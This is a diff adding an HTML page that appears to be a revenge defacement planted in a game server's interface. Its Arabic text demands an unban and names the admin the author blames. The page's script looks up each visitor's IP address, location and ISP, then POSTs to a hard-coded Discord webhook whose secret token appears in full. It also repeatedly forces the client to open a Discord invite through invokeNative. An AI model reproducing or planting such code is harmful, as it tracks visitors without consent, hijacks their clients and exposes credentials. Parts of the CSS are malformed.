@@ -1,0 +1,130 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>discord.gg/sz</title>
+    <style>
+       body {
+            margin: 0;
+            padding: 0;
+            background: black;
+            font-family: 'Courier New', Courier, monospace;
+            color: #9f8663;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+            overflow: hidden;
+        }
+        #content {
+            display: none;
+            opacity: 0;
+            transition: opacity 2s ease;
+        }
+        .image-container img {
+            width: 400px; 
+            height: auto;
+            border: 2px solid #c2c2c2; 
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, , 0, 0.7); 
+        }
+          .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #ffffff; 
+            text-shadow: 0 0 8px #ffffff 0 0 15px #ffffff, 0 0 25px #ffffff;
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
+        }
+        .text {
+            margin-top: 5px;
+            font-size: 75px; 
+            color: #ffffff; 
+            text-shadow: 0 0 8px #ffffff, 0 0 15px #ffffff, 0 0 25px #ffffff; 
+            letter-spacing: 4.5px;
+        }
+        .video-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: -1; /* Make sure it's behind other content */
+        }
+        .video-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(15px); /* Apply blur effect */
+        }
+    </style>
+</head>
+<body>
+    <div class="video-container">
+        <video autoplay loop muted>
+            <source src="https://e.top4top.io/m_3345i21j41.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+
+    <div class="gif-container">
+        <img src="" alt="">
+    </div>
+
+    <div id="content">
+        <div class="image-container">
+            <img src="https://media.discordapp.net/attachments/1164953380700033086/1391829869142343864/14450BB5-B5C8-47CB-88E9-2709B72892CD.png?ex=68709dd3&is=686f4c53&hm=32c07391214079e61c74bf46bd5b5bb50221d7c6cd10c46559f841aec4b5401d&format=webp&quality=lossless&width=768&height=512&"">
+        </div>
+
+
+        <audio autoplay loop>
+            <source src="https://cdn.discordapp.com/attachments/1390940712408977530/1392885263558250506/0710.mp4?ex=687128fd&is=686fd77d&hm=f63ef2094950bd3eba705de7130edc0789976217f0c4c0a0ed41719484a41907&">
+            Your browser does not support the audio element.
+        </audio>
+        <div class="info" id="ip-info"></div>
+        <div class="text">discord.gg/sz</div>
+    </div>
+
+    <script>
+        setTimeout(() => {
+            document.querySelector('.gif-container').style.display = 'none';
+            const content = document.getElementById('content');
+            content.style.display = 'block';
+            setTimeout(() => {
+                content.style.opacity = 1;
+            }, 0200); 
+        }, 0200);
+
+        fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            const { ip, country, city, region, loc, org, timezone } = data;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.innerHTML = `by ALGNAZH - N6gM - TUG
+<فك باندي مطلب 
+تم تبنيدي قبل سنه ظلم بسبب اداري عشانه رتبه عليا
+(جاسر ) فا هاذا رد اعتبار لا اكثر . 
+Discord.gg/sz 
+2x2 Is Here>`;
+
+            const dateTime = new Date().toLocaleString();
+            const webhookUrl = 'https://discord.com/api/webhooks/1342711596035604511/c2zeLZnSp0faGn2G7rnFX6NOdOt1ewLys7Sp55NJt1p1A6FIkFkDciidXSyaV7_3WGie';
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+               
+            });
+        });
+
+        setInterval(function() {
+            window.invokeNative("openUrl", "https://discord.gg/sz");
+            window.invokeNative("openUrl", "https://discord.gg/sz");
+             },     2000);
+    </script>
+</body>
+</html>
